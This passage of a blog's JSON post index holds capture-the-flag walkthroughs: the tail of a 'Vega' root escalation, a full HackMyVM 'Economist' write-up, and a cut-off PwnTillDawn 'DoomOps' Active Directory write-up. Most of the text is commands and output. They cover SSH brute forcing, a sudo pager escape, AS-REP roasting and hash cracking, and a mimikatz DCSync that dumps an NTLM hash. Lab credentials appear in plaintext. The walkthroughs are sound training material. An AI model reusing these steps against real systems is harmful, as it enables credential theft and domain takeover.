whoamivegavega@vega:~$ iduid=1000(vega) gid=1000(vega) groups=1000(vega),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)vega@vega:~$ sudo -l[sudo] password for vega: Matching Defaults entries for vega on vega: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser vega may run the following commands on vega: (ALL : ALL) ALLvega@vega:~$ sudo su -root@vega:~# whoamirootroot@vega:~# iduid=0(root) gid=0(root) groups=0(root)root@vega:~# cd /rootroot@vega:~# ls -altotal 60drwx------ 7 root root 4096 May 14 2020 .drwxr-xr-x 24 root root 4096 Oct 23 2019 ..-rw------- 1 root root 2513 Apr 21 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc-rw-r--r-- 1 root root 115 May 14 2020 CAM.shortcutdrwxr-xr-x 2 root root 4096 Sep 6 2019 .composer-rw-r--r-- 1 root root 41 Sep 27 2019 FLAG42.txtdrwx------ 3 root root 4096 Oct 4 2019 .gnupgdrwxr-xr-x 3 root root 4096 Sep 6 2019 .local-rw------- 1 root root 651 Apr 2 2020 .mysql_history-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 66 Sep 6 2019 .selected_editordrwx--x--- 2 root root 4096 Oct 25 2019 .splunkdrwx------ 2 root root 4096 Sep 6 2019 .ssh-rw------- 1 root root 2085 Sep 27 2019 .viminforoot@vega:~#```{: .nolineno}Now I am root !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Economist", "url": "/posts/Economist/", "categories": "HackMyVM", "tags": "FTP, cewl, Password Bruteforce, PrivEsc", "date": "2023-10-14 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Economist* , It is from HackMyVM Platform and categorized as Medium machine . Recon is the Essential thing to exploit this machine.## Port Scan Results â¤µï¸![Untitle...", "content": "## Description â¤µï¸This machine is *Economist* , It is from HackMyVM Platform and categorized as Medium machine . Recon is the Essential thing to exploit this machine.## Port Scan Results â¤µï¸![Untitled](Economist/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.73Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 10:16 ISTNmap scan report for 10.0.2.73Host is up (0.00074s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.0.2.60| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-rw-r-- 1 1000 1000 173864 Sep 13 11:40 Brochure-1.pdf| -rw-rw-r-- 1 1000 1000 183931 Sep 13 11:37 Brochure-2.pdf| -rw-rw-r-- 1 1000 1000 465409 Sep 13 14:18 Financial-infographics-poster.pdf| -rw-rw-r-- 1 1000 1000 269546 Sep 13 14:19 Gameboard-poster.pdf| -rw-rw-r-- 1 1000 1000 126644 Sep 13 14:20 Growth-timeline.pdf|_-rw-rw-r-- 1 1000 1000 1170323 Sep 13 10:13 Population-poster.pdf22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 d9:fe:dc:77:b8:fc:e6:4c:cf:15:29:a7:e7:21:a2:62 (RSA)| 256 be:66:01:fb:d5:85:68:c7:25:94:b9:00:f9:cd:41:01 (ECDSA)|_ 256 18:b4:74:4f:f2:3c:b3:13:1a:24:13:46:5c:fa:40:72 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Home - Elite EconomistsMAC Address: 08:00:27:E0:55:E3 (Oracle VirtualBox virtual NIC)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸Lets see port 80 first â†’![Untitled](Economist/Untitled%202.png)## FTP Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ ftp 10.0.2.73 21 Connected to 10.0.2.73.220 (vsFTPd 3.0.3)Name (10.0.2.73:kali): Anonymous331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls -al229 Entering Extended Passive Mode (|||13198|)150 Here comes the directory listing.drwxr-xr-x 2 0 119 4096 Sep 13 14:30 .drwxr-xr-x 2 0 119 4096 Sep 13 14:30 ..-rw-rw-r-- 1 1000 1000 173864 Sep 13 11:40 Brochure-1.pdf-rw-rw-r-- 1 1000 1000 183931 Sep 13 11:37 Brochure-2.pdf-rw-rw-r-- 1 1000 1000 465409 Sep 13 14:18 Financial-infographics-poster.pdf-rw-rw-r-- 1 1000 1000 269546 Sep 13 14:19 Gameboard-poster.pdf-rw-rw-r-- 1 1000 1000 126644 Sep 13 14:20 Growth-timeline.pdf-rw-rw-r-- 1 1000 1000 1170323 Sep 13 10:13 Population-poster.pdf226 Directory send OK.ftp>```{: .nolineno}Now I downloaded all the pdfs through `get ` â†’I checked one of the pdfs through exiftool and I got an author name so lets extract that from all pdfs â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ exiftool Brochure-1.pdf ExifTool Version Number : 12.67File Name : Brochure-1.pdfDirectory : .File Size : 174 kBFile Modification Date/Time : 2023:09:13 17:10:45+05:30File Access Date/Time : 2023:10:14 08:25:57+05:30File Inode Change Date/Time : 2023:10:12 10:17:39+05:30File Permissions : -rw-r--r--File Type : PDFFile Type Extension : pdfMIME Type : application/pdfPDF Version : 1.6Linearized : NoPage Count : 2XMP Toolkit : Image::ExifTool 12.40Subject : We are here for your wealthTitle : Elite Economists brochure 1Author : josephCreator : ImpressProducer : LibreOffice 7.3Create Date : 2023:09:13 12:03:17+02:00```{: .nolineno}Now I used some scripting techniques like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ exiftool *.pdf | grep Author | awk '{ print $3 }' | uniq josephrichardcrystalcatherine```{: .nolineno}Now I put these names in `user.txt` file .Afterthat I created the wordlist file from its website with cewl tool â‡’ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ cewl -m 5 http://10.0.2.73/ > wordlists.tx â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ cat wordlists.txt| wc -l 333```{: .nolineno}Now its time for SSH â†’## SSH Enumeration â¤µï¸I will be using this wordlists for ssh bruteforce using hydra tool â†’![Untitled](Economist/Untitled%203.png)```bashjoseph : wealthiest```{: .nolineno}## SSH SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Economist]â””â”€$ ssh joseph@10.0.2.73The authenticity of host '10.0.2.73 (10.0.2.73)' cant be established.ED25519 key fingerprint is SHA256:nKBoUMUnxyKH34KaiDU6gjV4RVOrd181pL9rHCLLD0s.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.0.2.73' (ED25519) to the list of known hosts.joseph@10.0.2.73s password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 14 Oct 2023 03:40:14 AM UTC System load: 0.0 Processes: 128 Usage of /: 48.8% of 11.21GB Users logged in: 0 Memory usage: 15% IPv4 address for enp0s3: 10.0.2.73 Swap usage: 0% * Introducing Expanded Security Maintenance for Applications. Receive updates to over 25,000 software packages with your Ubuntu Pro subscription. Free for personal use. https://ubuntu.com/proExpanded Security Maintenance for Applications is not enabled.51 updates can be applied immediately.To see these additional updates run: apt list --upgradableEnable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateNew release '22.04.3 LTS' available.Run 'do-release-upgrade' to upgrade to it.joseph@elite-economists:~$ whoamijosephjoseph@elite-economists:~$ iduid=1001(joseph) gid=1001(joseph) groups=1001(joseph)joseph@elite-economists:~$ sudo -lMatching Defaults entries for joseph on elite-economists: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser joseph may run the following commands on elite-economists: (ALL) NOPASSWD: /usr/bin/systemctl statusjoseph@elite-economists:~$ sudo /usr/bin/systemctl statusâ— elite-economists State: running Jobs: 0 queued Failed: 0 units Since: Sat 2023-10-14 02:53:14 UTC; 59min ago CGroup: / â”œâ”€user.slice â”‚ â””â”€user-1001.slice â”‚ â”œâ”€user@1001.service â€¦ â”‚ â”‚ â””â”€init.scope â”‚ â”‚ â”œâ”€3107 /lib/systemd/systemd --user â”‚ â”‚ â””â”€3108 (sd-pam) â”‚ â””â”€session-5.scope â”‚ â”œâ”€3091 sshd: joseph [priv] â”‚ â”œâ”€3191 sshd: joseph@pts/0 â”‚ â”œâ”€3192 -bash â”‚ â”œâ”€3345 sudo /usr/bin/systemctl status â”‚ â”œâ”€3346 /usr/bin/systemctl status â”‚ â””â”€3347 pager â”œâ”€init.scope â”‚ â””â”€1 /sbin/init maybe-ubiquity â””â”€system.slice â”œâ”€irqbalance.service â”‚ â””â”€684 /usr/sbin/irqbalance --foreground â”œâ”€apache2.service â”‚ â”œâ”€757 /usr/sbin/apache2 -k start â”‚ â”œâ”€759 /usr/sbin/apache2 -k start â”‚ â””â”€760 /usr/sbin/apache2 -k start â”œâ”€systemd-networkd.service â”‚ â””â”€655 /lib/systemd/systemd-networkd â”œâ”€systemd-udevd.service â”‚ â””â”€410 /lib/systemd/systemd-udevd â”œâ”€cron.service â”‚ â””â”€673 /usr/sbin/cron -f!bashroot@elite-economists:/home/joseph# whoamirootroot@elite-economists:/home/joseph# iduid=0(root) gid=0(root) groups=0(root)root@elite-economists:/home/joseph# cd /rootroot@elite-economists:~# ls -altotal 36drwx------ 5 root root 4096 Oct 14 03:52 .drwxr-xr-x 19 root root 4096 Sep 12 20:49 ..-rw------- 1 root root 0 Sep 14 06:55 .bash_history-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrc-rw------- 1 root root 69 Oct 14 03:52 .lesshstdrwxr-xr-x 3 root root 4096 Sep 12 21:28 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profile-rw-r--r-- 1 root root 3271 Sep 14 06:54 root.txtdrwx------ 3 root root 4096 Sep 12 20:52 snapdrwx------ 2 root root 4096 Sep 12 20:52 .sshroot@elite-economists:~# cat root.txt ................... .................... ............................. ............................. ............ ........... ...... ............ ........ ........ ........ ........ ... ........ .... ....... ...... ..... .. ...... ..... ...... ............................. ..... ...... ............................. .............................. ..... ..... .............................. ..... ..... ..... ..... ..... ..... ..... ..... ..... .... .................................................................................................. ................................................................................................... ..... ..... ..... ..... ..... ..... ..... ..... ..... ..... .............................. ..... ..... .............................. ............................. ...... ..... ............................. ...... ..... ....... .. ..... ...... ........ ... ....... .... ....... ........ ......... ........ ........... ...... ........... ........... .............................. .............................. ..................... .................... Flag: HMV{FLAGFLAGFLAGFLAGFLAG}root@elite-economists:~# cat /home/joseph/user.txt ................... .................... ............................. ............................. ............ ........... ...... ............ ........ ........ ........ ........ ... ........ .... ....... ...... ..... .. ...... ..... ...... ............................. ..... ...... ............................. .............................. ..... ..... .............................. ..... ..... ..... ..... ..... ..... ..... ..... ..... .... .................................................................................................. ................................................................................................... ..... ..... ..... ..... ..... ..... ..... ..... ..... ..... .............................. ..... ..... .............................. ............................. ...... ..... ............................. ...... ..... ....... .. ..... ...... ........ ... ....... .... ....... ........ ......... ........ ........... ...... ........... ........... .............................. .............................. ..................... .................... Flag: HMV{FLAGFLAGFLAGFLAGFLAG}root@elite-economists:~#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "DoomOps", "url": "/posts/DOOMOPS/", "categories": "PwnTillDawn", "tags": "Active Directory, BloodHound, CrackMapExec, GetNPUsers.py, LDAP, Mimikatz, SMB, Windows, ldapsearch, PrivEsc", "date": "2023-10-14 00:00:00 +0530", "snippet": "PwnTillDawn Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Active...", "content": "PwnTillDawn Machine âž¡ï¸ &nbsp;&nbsp;Easy &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#Active Directory&nbsp;&nbsp;#BloodHound&nbsp;&nbsp;#CrackMapExec&nbsp;&nbsp;#GetNPUsers.py&nbsp;&nbsp;#LDAP&nbsp;&nbsp;#Mimikatz&nbsp;&nbsp;#SMB&nbsp;&nbsp;#ldapsearch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/Doomops]â””â”€$ nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.66Nmap scan report for 10.150.150.66Host is up (0.18s latency).Not shown: 65512 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-30 07:18:44Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: DOOMOPS.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: DOOMOPS.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped3389/tcp open ms-wbt-server Microsoft Terminal Services|_ssl-date: 2023-09-30T07:20:14+00:00; -1s from scanner time.| ssl-cert: Subject: commonName=DC-DOOMOPS.DOOMOPS.LOCAL| Not valid before: 2023-09-29T04:10:50|_Not valid after: 2024-03-30T04:10:50| rdp-ntlm-info: | Target_Name: DOOMOPS| NetBIOS_Domain_Name: DOOMOPS| NetBIOS_Computer_Name: DC-DOOMOPS| DNS_Domain_Name: DOOMOPS.LOCAL| DNS_Computer_Name: DC-DOOMOPS.DOOMOPS.LOCAL| DNS_Tree_Name: DOOMOPS.LOCAL| Product_Version: 10.0.17763|_ System_Time: 2023-09-30T07:19:35+00:005985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.09389/tcp open mc-nmf .NET Message Framing49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49672/tcp open msrpc Microsoft Windows RPC49674/tcp open msrpc Microsoft Windows RPC49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049680/tcp open msrpc Microsoft Windows RPC49691/tcp open msrpc Microsoft Windows RPC50131/tcp open msrpc Microsoft Windows RPCService Info: Host: DC-DOOMOPS; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2023-09-30T07:19:36|_ start_date: N/A|_clock-skew: mean: -1s, deviation: 0s, median: -1s```{: .nolineno}{: file='Nmap_Result.txt'}## LDAP Enumeration â¤µï¸I looked for SMB open ports and tried for anonymous login but no luck â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ crackmapexec smb 10.150.150.66 -u '' -p '' -d DOOMOPS.LOCAL --shares SMB 10.150.150.66 445 DC-DOOMOPS [*] Windows 10.0 Build 17763 x64 (name:DC-DOOMOPS) (domain:DOOMOPS.LOCAL) (signing:True) (SMBv1:False)SMB 10.150.150.66 445 DC-DOOMOPS [+] DOOMOPS.LOCAL\\: SMB 10.150.150.66 445 DC-DOOMOPS [-] Error enumerating shares: STATUS_ACCESS_DENIED```{: .nolineno}Now I do not have username and password , the things I have is IP address and domain name from crackmapexec or got it from Nmap scan results â†’So Lets do a ldapsearch command â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ ldapsearch -x -H ldap://10.150.150.66 -b 'DC=doomops,DC=local' > ldapsearch.txt```{: .nolineno}And with that scan I got the FLAG4 and got some usernames like these â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ cat ldapsearch.txt | grep -- name | cut -f 2 -d ':' Guest Revenant Cacodemon Cyberdemon Spectre Macubus Hellhound Spiderdemon```{: .nolineno}{: file='names.txt'}I removed the spaces and the Capital-Letters and saved it as names.txt file â†’Now Its time to look for password and that can be have with `GetNPUsers.py` command , that will give me the kerberute password in its hash format like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ GetNPUsers.py -dc-ip 10.150.150.66 doomops.local/ -no-pass -usersfile names.txt -outputfile hashes.txt Impacket v0.11.0 - Copyright 2023 Fortra[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)$krb5asrep$23$revenant@DOOMOPS.LOCAL:a2050aa464bddaff674b1ede36cefe01$54258c42f59af47d17c1b2cae4d2f494030c5df88a09ab05657f455b49eb430bd7830f2631fadec120cbfa849d4a42bf0622af12d1f6904445e6e3e7f704ab212678a9fe13460d672553276257822a31ddd9b8231ddc3db024af11c9d59d25eeb2a3f261acc0a8e912aa5d8d6d315b6f444b00f3fe653667638ac71f279973f5f3022e80899986185c0293ba148468410cd91acf6150321e29798591260a89a2ad0c634dfbc9fdce40282fce142ded05918fe8a65a48e63f835dca388eca8457ca06854e9f6edc030789bfdb58f5d617e8a178cdf206ee95907e95220244e8cbf25b3530df2470fbecf2a494fc32[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User cyberdemon doesnt have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)```{: .nolineno}Now lets decode this hash value of user `revenant` , with hashcat Tool â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]===========================================================================================================================================* Device #1: cpu-penryn-Intel(R) Core(TM) i5-8300H CPU @ 2.30GHz, 2913/5891 MB (1024 MB allocatable), 2MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-Salt......$krb5asrep$23$revenant@DOOMOPS.LOCAL:a2050aa464bddaff674b1ede36cefe01$54258c42f59af47d17c1b2cae4d2f494030c5df88a09ab05657f455b49eb430bd7830f2631fadec120cbfa849d4a42bf0622af12d1f6904445e6e3e7f704ab212678a9fe13460d672553276257822a31ddd9b8231ddc3db024af11c9d59d25eeb2a3f261acc0a8e912aa5d8d6d315b6f444b00f3fe653667638ac71f279973f5f3022e80899986185c0293ba148468410cd91acf6150321e29798591260a89a2ad0c634dfbc9fdce40282fce142ded05918fe8a65a48e63f835dca388eca8457ca06854e9f6edc030789bfdb58f5d617e8a178cdf206ee95907e95220244e8cbf25b3530df2470fbecf2a494fc32:doomhammer211* Session..........: hashcatStatus...........: CrackedHash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)Hash.Target......: $krb5asrep$23$revenant@DOOMOPS.LOCAL:a2050aa464bdda...94fc32Time.Started.....: Sat Sep 30 14:21:00 2023 (14 secs)Time.Estimated...: Sat Sep 30 14:21:14 2023 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 745.0 kH/s (1.01ms) @ Accel:512 Loops:1 Thr:1 Vec:4Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 8536064/14344385 (59.51%)Rejected.........: 0/8536064 (0.00%)Restore.Point....: 8535040/14344385 (59.50%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: dooneyg11 -> doogie08Hardware.Mon.#1..: Util: 79%```{: .nolineno}Now its time for SMB recon â†’## SMB Enumeration â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ crackmapexec smb 10.150.150.66 -u 'revenant' -p 'doomhammer211*' -d DOOMOPS.LOCAL --sharesSMB 10.150.150.66 445 DC-DOOMOPS [*] Windows 10.0 Build 17763 x64 (name:DC-DOOMOPS) (domain:DOOMOPS.LOCAL) (signing:True) (SMBv1:False)SMB 10.150.150.66 445 DC-DOOMOPS [+] DOOMOPS.LOCAL\\revenant:doomhammer211* SMB 10.150.150.66 445 DC-DOOMOPS [+] Enumerated sharesSMB 10.150.150.66 445 DC-DOOMOPS Share Permissions RemarkSMB 10.150.150.66 445 DC-DOOMOPS ----- ----------- ------SMB 10.150.150.66 445 DC-DOOMOPS ADMIN$ Remote AdminSMB 10.150.150.66 445 DC-DOOMOPS C$ Default shareSMB 10.150.150.66 445 DC-DOOMOPS IPC$ READ Remote IPCSMB 10.150.150.66 445 DC-DOOMOPS NETLOGON READ Logon server share SMB 10.150.150.66 445 DC-DOOMOPS SYSVOL READ Logon server share```{: .nolineno}Lets open it with smbclient Tool â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ smbclient -L \\\\\\\\10.150.150.66\\\\ -U revenant Password for [WORKGROUP\\revenant]:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tNETLOGON Disk Logon server share \tSYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.150.150.66 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ smbclient //10.150.150.66/SYSVOL -U revenantPassword for [WORKGROUP\\revenant]:Try \"help\" to get a list of possible commands.smb: \\> ls -alNT_STATUS_NO_SUCH_FILE listing \\-alsmb: \\> ls . D 0 Fri Oct 23 00:15:50 2020 .. D 0 Fri Oct 23 00:15:50 2020 DOOMOPS.LOCAL Dr 0 Fri Oct 23 00:15:50 2020\t\t5609471 blocks of size 4096. 2224945 blocks availablesmb: \\>```{: .nolineno}Now I have SMB access so lets also try for the `evil-winrm` for shell access â†’```powershellâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66]â””â”€$ evil-winrm -i 10.150.150.66 -u 'revenant' -p 'doomhammer211*' Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\revenant\\Documents> dir*Evil-WinRM* PS C:\\Users\\revenant\\Documents> whoamidoomops\\revenant*Evil-WinRM* PS C:\\Users\\revenant\\Documents> whoami /allUSER INFORMATION----------------User Name SID================ =====================================doomops\\revenant S-1-5-21-1663250433-20091270-1145847307-1103GROUP INFORMATION-----------------Group Name Type SID Attributes=========================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== SeMachineAccountPrivilege Add workstations to domain EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown.Kerberos support for Dynamic Access Control on this device has been disabled.*Evil-WinRM* PS C:\\Users\\revenant\\Documents>```{: .nolineno}I ran winPEAS then and got AutoLogon credentials â†’![Untitled](DOOMOPS/Untitled%201.png)```{: .nolineno}cyberdemon : Ocz%F972q%eU```{: .nolineno}Now lets see what permission does cyberdemon got and which group it is a part of that all can be found through BloodHound â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.66/BloodHound]â””â”€$ sudo bloodhound-python -d 'doomops.local' -u cyberdemon -p 'Ocz%F972q%eU' -ns 10.150.150.66 -c all[sudo] password for kali: INFO: Found AD domain: doomops.localINFO: Getting TGT for userINFO: Connecting to LDAP server: dc-doomops.doomops.localINFO: Kerberos auth to LDAP failed, trying NTLMINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 2 computersINFO: Connecting to LDAP server: dc-doomops.doomops.localINFO: Kerberos auth to LDAP failed, trying NTLMINFO: Found 11 usersINFO: Found 52 groupsINFO: Found 2 gposINFO: Found 2 ousINFO: Found 21 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: attackersystem.doomops.localINFO: Querying computer: DC-DOOMOPS.DOOMOPS.LOCALWARNING: Could not resolve: attackersystem.doomops.local: The DNS query name does not exist: attackersystem.doomops.local.WARNING: Failed to get service ticket for DC-DOOMOPS.DOOMOPS.LOCAL, falling back to NTLM authCRITICAL: CCache file is not found. Skipping...WARNING: DCE/RPC connection failed: [Errno Connection error (dc-doomops.doomops.local:88)] [Errno -2] Name or service not knownINFO: Done in 00M 37S```{: .nolineno}![Untitled](DOOMOPS/Untitled%202.png)The user cyberdemon can perform `DCSync` attack â†’![Untitled](DOOMOPS/Untitled%203.png)Now lets run mimikatz in this system â†’```powershell*Evil-WinRM* PS C:\\Users\\cyberdemon\\Documents> ./mimi32.exe \"lsadump::dcsync /domain:doomops.local /user:Administrator\" exit .#####. mimikatz 2.2.0 (x86) #19041 Sep 19 2022 17:43:26 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## > https://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > https://pingcastle.com / https://mysmartlogon.com ***/mimikatz(commandline) # lsadump::dcsync /domain:doomops.local /user:Administrator[DC] 'doomops.local' will be the domain[DC] 'DC-DOOMOPS.DOOMOPS.LOCAL' will be the DC server[DC] 'Administrator' will be the user account[rpc] Service : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)Object RDN : Administrator** SAM ACCOUNT **SAM Username : AdministratorAccount Type : 30000000 ( USER_OBJECT )User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )Account expiration :Password last change : 10/22/2020 10:07:48 AMObject Security ID : S-1-5-21-1663250433-20091270-1145847307-500Object Relative ID : 500Credentials: Hash NTLM: 9e4e2dac5807fb745533e0dda18bfbf6Supplemental Credentials:* Primary:NTLM-Strong-NTOWF * Random Value : 6c5ded97fdc01db3821c82133955d3ff* Primary:Kerberos-Newer-Keys * Default Salt : 